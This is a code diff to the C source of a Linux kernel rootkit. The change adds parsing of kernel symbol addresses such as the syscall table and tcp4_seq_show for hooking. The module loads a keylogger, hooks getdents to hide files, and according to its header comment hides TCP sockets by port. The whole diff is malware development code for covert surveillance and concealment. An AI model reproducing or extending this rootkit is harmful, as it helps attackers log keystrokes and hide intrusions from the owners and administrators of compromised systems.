@@ -9,18 +9,39 @@ fetures such as:
 3. hide file by the name provide
 4. hide tcp sockets by port 
 */
+bool check_parms(void)
+{
+    if(sys_call_table_addr_str == NULL){return false;}
+    else if(sysfs_remove_dir_addr_str == NULL){return false;}
+    else if(sysfs_create_dir_ns_addr_str == NULL){return false;}
+    else if(tcp4_seq_show_addr_str == NULL){return false;}
+    return true;
 
-
+}
+void hundle_parms(void)
+{
+    char* ptr;
+    sys_call_table_addr = strtoul(sys_call_table_addr_str,&ptr, 10);
+    sysfs_remove_dir_addr = strtoul(sysfs_remove_dir_addr_str,&ptr, 10);
+    sysfs_create_dir_ns_addr = strtoul(sysfs_create_dir_ns_addr_str,&ptr, 10);
+    tcp4_seq_show_addr = strtoul(tcp4_seq_show_addr_str,&ptr, 10);
+}
 static int __init start_rootkit(void)
 {
+    if(!check_parms())
+    {
+        printk(KERN_ALERT "rk: error in prams! -> stop loading the module");
+
+    }
+    hundle_parms();
     ret=0;
     extern struct dentry *subdir;
     subdir = debugfs_create_dir("rootkit", NULL);
-    /*if (!file)
+    if (!subdir)
     {
         debugfs_remove_recursive(subdir);
         return -ENOENT;
-    }*/
+    }
 
     
 
@@ -34,7 +55,6 @@ static int __init start_rootkit(void)
         return -1;
     }
     printk(KERN_ALERT "rk: keylogger load!");
-    printk(KERN_ALERT "rk: module hide himself!");
     //HIDE FILE
     ret = getdents_hook_init();
     if (ret==-1)
